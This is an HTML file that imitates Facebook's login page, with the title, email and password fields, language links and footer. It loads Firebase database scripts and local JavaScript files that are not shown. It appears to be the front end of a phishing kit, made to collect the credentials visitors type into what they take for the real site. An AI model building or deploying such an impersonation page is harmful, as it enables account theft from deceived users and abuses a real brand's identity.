<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <link rel="icon" href="assets/img/logo.png">

    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="assets/css/style.css">
    <title>Log into Facebook | Facebook</title>
</head>

<body>
    <div class="all">
        <!-- Header -->
        <div class="header">facebook</div>

        <!-- Form -->
        <form>
            <input type="text" placeholder="Email or Phone" id="email">
            <input type="password" placeholder="Password" id="password">
            <input type="submit" value="Log  In">
        </form>

        <!-- hr -->
        <div class="hr">
            <div class="box"></div>
            <p>or</p>
            <div class="box"></div>
        </div>

        <!-- Create Acc -->
        <div class="wrap">
            <input type="submit" value="Create New Account" class="newacc">
            <a href="#">Forgot password? - Help Center</a>
        </div>
    </div>
    <!-- Footer -->
    <footer>
        <div class="wrapper">
            <div class="left">
                <strong>English (US)</strong><br>
                <a href="#">Italiano</a><br>
                <a href="#">Deutsch</a><br>
                <a href="#">Português (Brasil)</a>
            </div>
            <div class="right">
                <a href="#">Français (France)</a><br>
                <a href="#">Ελληνικά</a><br>
                <a href="#">Español</a><br>
            </div>
        </div>
        <p>Facebook ©2018</p>
    </footer>

    <script src="https://www.gstatic.com/firebasejs/5.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/5.7.0/firebase-database.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/detail.js"></script>
</body>

</html>
